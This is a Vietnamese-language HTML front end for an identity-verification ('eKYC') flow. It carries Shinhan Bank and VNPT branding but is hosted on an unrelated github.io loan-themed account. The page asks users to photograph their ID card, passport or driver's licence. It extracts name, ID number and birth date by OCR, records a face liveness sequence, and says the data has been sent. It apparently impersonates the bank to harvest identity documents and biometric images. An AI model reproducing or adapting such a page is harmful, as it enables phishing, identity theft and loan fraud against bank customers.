<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VNPT eKYC - Xác thực danh tính</title>
    <link rel="icon" href="https://vaytieudung.github.io/shinhanbank/favicon.ico"/>
    
    <!-- Font Awesome Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="main-container">
        <!-- Header -->
        <header class="top-header">
            <img class="logo" src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Logo">
            <div class="lang-switcher">
                <button id="btnLang">EN</button>
            </div>
            <div class="hotline">
                <i class="fas fa-phone-alt"></i>
                <span>Hotline: 1800 1166</span>
            </div>
        </header>

        <!-- Progress Stepper -->
        <div id="stepper" class="stepper">Bước 1/4: Chọn loại giấy tờ</div>

        <!-- Main Content -->
        <main id="viewContainer" class="content-wrapper">
            <!-- View 1: Document Selection -->
            <div id="docSelectView">
                <h2 class="section-title">Xác thực giấy tờ</h2>
                <p class="section-subtitle">Chọn một trong các phương thức xác thực dưới đây</p>
                <div class="doc-options">
                    <div class="doc-option" data-type="cccd">
                        <img class="doc-icon" src="https://vaytieudung.github.io/shinhanbank/lib/icon_id.png" alt="Biểu tượng thẻ căn cước">
                        <div class="doc-label">Chứng minh thư, Thẻ căn cước</div>
                        <div class="chevron"><i class="fa fa-chevron-right"></i></div>
                    </div>
                    <div class="doc-option" data-type="passport">
                        <img class="doc-icon" src="https://vaytieudung.github.io/shinhanbank/lib/icon_passport.png" alt="Biểu tượng Hộ chiếu">
                        <div class="doc-label">Hộ chiếu</div>
                        <div class="chevron"><i class="fa fa-chevron-right"></i></div>
                    </div>
                    <div class="doc-option" data-type="driver">
                        <img class="doc-icon" src="https://vaytieudung.github.io/shinhanbank/lib/icon_driver_license.png" alt="Biểu tượng Bằng lái xe">
                        <div class="doc-label">Bằng lái xe</div>
                        <div class="chevron"><i class="fa fa-chevron-right"></i></div>
                   </div>
                    <div class="doc-option" data-type="qr" role="button" aria-label="Chọn Quét mã QR">
                        <img class="doc-icon" src="https://vaytieudung.github.io/shinhanbank/pages/vi/qrcode.png" alt="Biểu tượng mã QR">
                        <div class="doc-label" data-lang-key="docselect_qr">Quét mã QR</div>
                        <div class="chevron"><i class="fa fa-chevron-right"></i></div>
                    </div>
                     <div class="doc-option" data-type="other" role="button" aria-label="Chọn Giấy tờ khác">
                        <img class="doc-icon" src="https://vaytieudung.github.io/shinhanbank/lib/icon_other.png" alt="Biểu tượng Giấy tờ khác">
                        <div class="doc-label" data-lang-key="docselect_other">Giấy tờ khác</div>
                        <div class="chevron"><i class="fa fa-chevron-right"></i></div>
                    </div>
                </div>
            </div>

            <!-- View 2: Capture (Document Front/Back) -->
            <div id="captureView" class="hidden">
                <h2 class="section-title" id="captureTitle"></h2>
                <p class="section-subtitle" id="captureSubtitle"></p>
                <div class="camera-container">
                    <video id="cameraVideo" autoplay playsinline muted></video>
                    <canvas id="cameraCanvas" class="hidden"></canvas>
                    <canvas id="detectionCanvas"></canvas>
                    <div id="cameraFrame" class="capture-frame"></div>
                    <svg id="cameraOverlay" class="camera-overlay" viewBox="0 0 640 400" preserveAspectRatio="xMidYMid slice">
                        <defs>
                            <mask id="idMask">
                                <rect width="100%" height="100%" fill="white"/>
                                <rect x="80" y="60" width="480" height="280" rx="15" fill="black"/>
                            </mask>
                            <mask id="faceMask">
                                <rect width="100%" height="100%" fill="white"/>
                                <ellipse cx="320" cy="200" rx="150" ry="190" fill="black"/>
                            </mask>
                        </defs>
                        <rect id="idOverlay" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#idMask)"/>
                        <rect id="faceOverlay" class="hidden" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#faceMask)"/>
                    </svg>
                </div>
                <p id="captureInstruction" class="capture-instruction"></p>
                <div id="errorMessage" class="error-message"></div>
                <div class="action-buttons">
                    <button id="btnCapture" class="btn-custom btn-main"><i class="fas fa-camera"></i> Chụp Ảnh</button>
                    <button id="btnBack" class="btn-custom btn-secondary-custom"><i class="fas fa-arrow-left"></i> Quay lại</button>
                </div>
                <div class="upload-fallback hidden">
                    <p>Hoặc tải ảnh lên từ thiết bị:</p>
                    <button id="btnUpload" class="btn-custom btn-secondary-custom"><i class="fas fa-upload"></i> Tải ảnh lên</button>
                    <input type="file" id="imageUpload" accept="image/*">
                </div>
            </div>

            <!-- View 3: QR Scanner Modal -->
            <div id="qrScannerModal" class="qr-scanner-modal hidden">
                <video id="qrVideo" playsinline></video>
                <div id="qrMessage">Hướng camera vào mã QR</div>
                <button id="btnCancelQR" class="btn-custom btn-secondary-custom" style="margin-top: 20px;">Hủy</button>
            </div>

            <!-- View 4: Confirmation -->
            <div id="confirmView" class="hidden">
                <h2 class="section-title">Xác nhận thông tin</h2>
                <p class="section-subtitle">Vui lòng kiểm tra kỹ hình ảnh và thông tin. Bạn có thể chụp lại nếu cần.</p>
                <div class="confirmation-grid">
                    <div class="confirm-item">
                        <div class="label">Mặt trước</div>
                        <img id="confirmFrontImg" alt="Ảnh mặt trước">
                        <button class="btn-custom btn-secondary-custom" data-retake="front"><i class="fas fa-redo"></i> Chụp lại</button>
                    </div>
                    <div class="confirm-item" id="confirmBackItem">
                        <div class="label">Mặt sau</div>
                        <img id="confirmBackImg" alt="Ảnh mặt sau">
                        <button class="btn-custom btn-secondary-custom" data-retake="back"><i class="fas fa-redo"></i> Chụp lại</button>
                    </div>
                </div>
                <div class="info-card">
                    <div class="info-row">
                        <span class="info-label">Số giấy tờ:</span>
                        <span id="infoIdNumber" class="info-value">Đang xử lý...</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Họ và tên:</span>
                        <span id="infoFullName" class="info-value">Đang xử lý...</span>
                    </div>
                    <div class="info-row" id="infoDobRow">
                        <span class="info-label">Ngày sinh:</span>
                        <span id="infoDob" class="info-value">Đang xử lý...</span>
                    </div>
                </div>
                <div class="action-buttons">
                    <button id="btnConfirmInfo" class="btn-custom btn-main">Xác nhận thông tin</button>
                </div>
            </div>

            <!-- View 5: Video Tutorial for Liveness -->
            <div id="videoTutorialView" class="hidden">
                <h2 class="section-title">Hướng dẫn xác thực khuôn mặt</h2>
                <p class="section-subtitle">Vui lòng xem video để thực hiện đúng cách và đảm bảo tỷ lệ thành công cao nhất.</p>
                <video id="tutorialVideo" width="100%" controls loop autoplay muted playsinline>
                    <source src="https://vaytieudung.github.io/shinhanbank/lib/vietnamese-tutorial.mp4" type="video/mp4">
                    Trình duyệt của bạn không hỗ trợ thẻ video.
                </video>
                <div class="action-buttons">
                    <button id="btnStartFaceCapture" class="btn-custom btn-main">Tôi đã hiểu, bắt đầu!</button>
                </div>
            </div>

            <!-- View 6: Face Capture (Liveness Check) -->
            <div id="faceCaptureView" class="hidden">
                <h2 class="section-title" id="faceCaptureTitle">Xác thực khuôn mặt</h2>
                <p class="section-subtitle" id="faceCaptureSubtitle">Vui lòng giữ khuôn mặt của bạn trong khung hình oval.</p>
                <div class="camera-container">
                    <video id="faceCameraVideo" autoplay playsinline muted></video>
                    <canvas id="faceCameraCanvas"></canvas>
                    <svg id="faceCameraOverlay" class="camera-overlay" viewBox="0 0 640 400" preserveAspectRatio="xMidYMid slice">
                        <defs>
                            <mask id="faceLivenessMask">
                                <rect width="100%" height="100%" fill="white"/>
                                <ellipse cx="320" cy="200" rx="150" ry="190" fill="black"/>
                            </mask>
                        </defs>
                        <rect id="faceLivenessOverlay" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#faceLivenessMask)"/>
                    </svg>
                </div>
                <p id="faceCaptureInstruction" class="capture-instruction">Đưa khuôn mặt vào trong khung</p>
                <div class="liveness-status">
                    <div class="liveness-step" id="livenessStep1">
                        <i class="fas fa-circle"></i>
                        <span>Nhìn thẳng</span>
                    </div>
                    <div class="liveness-step" id="livenessStep2">
                        <i class="fas fa-circle"></i>
                        <span>Vui lòng mỉm cười</span>
                    </div>
                    <div class="liveness-step" id="livenessStep3">
                        <i class="fas fa-circle"></i>
                        <span>Quay mặt sang phải</span>
                    </div>
                    <div class="liveness-step" id="livenessStep4">
                        <i class="fas fa-circle"></i>
                        <span>Quay mặt sang trái</span>
                    </div>
                    <div class="liveness-step" id="livenessStep5">
                        <i class="fas fa-circle"></i>
                        <span>Xác thực thành công!</span>
                    </div>
                </div>
                <div id="lottieProcessing" class="lottie-container"></div>
                <div class="action-buttons">
                    <button id="btnConfirmLiveness" class="btn-custom btn-main" disabled>Xác nhận</button>
                </div>
            </div>

            <!-- View 7: Success -->
            <div id="successView" class="hidden">
                <div id="lottieSuccess" class="lottie-container"></div>
                <h2 class="section-title">Xác thực thành công!</h2>
                <p class="section-subtitle">Cảm ơn bạn đã hoàn tất quá trình xác thực eKYC. Thông tin của bạn đã được gửi đi an toàn.</p>
                <div class="action-buttons">
                    <button id="btnFinalConfirm" class="btn-custom btn-main">Xác nhận</button>
                </div>
            </div>
        </main>
    </div>

    <!-- Guide Modals -->
    <div id="cccdGuideModal" class="modal-overlay hidden">
        <div class="modal-content">
            <h2 class="section-title">Hướng dẫn chụp ảnh CMT, CCCD</h2>
            <div class="guide-layout">
                <div class="guide-grid-2-col">
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png" alt="Ảnh mặt trước hợp lệ">
                        <p class="ok"><i class="fas fa-check-circle"></i> Bước 1: Chụp mặt trước</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png" alt="Ảnh mặt sau hợp lệ">
                        <p class="ok"><i class="fas fa-check-circle"></i> Bước 2: Chụp mặt sau</p>
                    </div>
                </div>
                <div class="guide-main-text">
                    <p>• Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn.</p>
                    <p>• Chụp rõ nét và đầy đủ thông tin trên giấy tờ.</p>
                </div>
                <div class="guide-grid-3-col">
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo.png" alt="Ảnh bị mờ">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp quá mờ</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang.png" alt="Ảnh bị lóa">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp lóa sáng</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc.png" alt="Ảnh bị che góc">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp mất góc</p>
                    </div>
                </div>
            </div>
            <div class="action-buttons" style="margin-top: 24px;">
                <button class="btn-custom btn-main btn-proceed">Đã hiểu</button>
            </div>
        </div>
    </div>

    <div id="passportGuideModal" class="modal-overlay hidden">
        <div class="modal-content">
            <h2 class="section-title">Hướng dẫn chụp ảnh Hộ chiếu</h2>
            <p class="section-subtitle" style="margin-bottom: 24px;">Vui lòng chụp trang có ảnh và thông tin cá nhân.</p>
            <div class="guide-layout">
                <div class="guide-item guide-top-image">
                    <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt2.png" alt="Ảnh hộ chiếu hợp lệ">
                </div>
                <div class="guide-main-text">
                    <p>• Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn.</p>
                    <p>• Chụp rõ nét và đầy đủ thông tin trên giấy tờ.</p>
                </div>
                <div class="guide-grid-3-col">
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo2.png" alt="Ảnh bị mờ">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp quá mờ</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang2.png" alt="Ảnh bị lóa">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp lóa sáng</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc2.png" alt="Ảnh bị che góc">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp mất góc</p>
                    </div>
                </div>
            </div>
            <div class="action-buttons" style="margin-top: 24px;">
                <button class="btn-custom btn-main btn-proceed">Đã hiểu</button>
            </div>
        </div>
    </div>

    <div id="driverLicenseGuideModal" class="modal-overlay hidden">
        <div class="modal-content">
            <h2 class="section-title">Hướng dẫn chụp ảnh Bằng lái xe</h2>
            <p class="section-subtitle" style="margin-bottom: 24px;">Vui lòng chụp mặt trước của bằng lái xe.</p>
            <div class="guide-layout">
                <div class="guide-item guide-top-image">
                    <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt1.png" alt="Ảnh bằng lái xe hợp lệ">
                </div>
                <div class="guide-main-text">
                    <p>• Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn.</p>
                    <p>• Chụp rõ nét và đầy đủ thông tin trên giấy tờ.</p>
                </div>
                <div class="guide-grid-3-col">
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo1.png" alt="Ảnh bị mờ">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp quá mờ</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang1.png" alt="Ảnh bị lóa">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp lóa sáng</p>
                    </div>
                    <div class="guide-item">
                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc1.png" alt="Ảnh bị che góc">
                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp mất góc</p>
                    </div>
                </div>
            </div>
            <div class="action-buttons" style="margin-top: 24px;">
                <button class="btn-custom btn-main btn-proceed">Đã hiểu</button>
            </div>
        </div>
    </div>

    <!-- Fullscreen Image Modal -->
    <div id="fullscreenModal" class="fullscreen-modal hidden" onclick="this.classList.add('hidden')">
        <img id="fullscreenImage" src="" alt="Ảnh phóng to">
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay hidden">
        <div id="lottieLoading"></div>
        <p class="loading-text">Đang tải tài nguyên...</p>
    </div>

    <!-- Libraries -->
    <script src="https://vaytieudung.github.io/shinhanbank/assets/js/opencv.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/face-api.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/jsQR.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/lottie.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/jquery-3.6.0.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5.1.0/dist/tesseract.min.js"></script>

    <script src="script.js"></script>
</body>
</html>
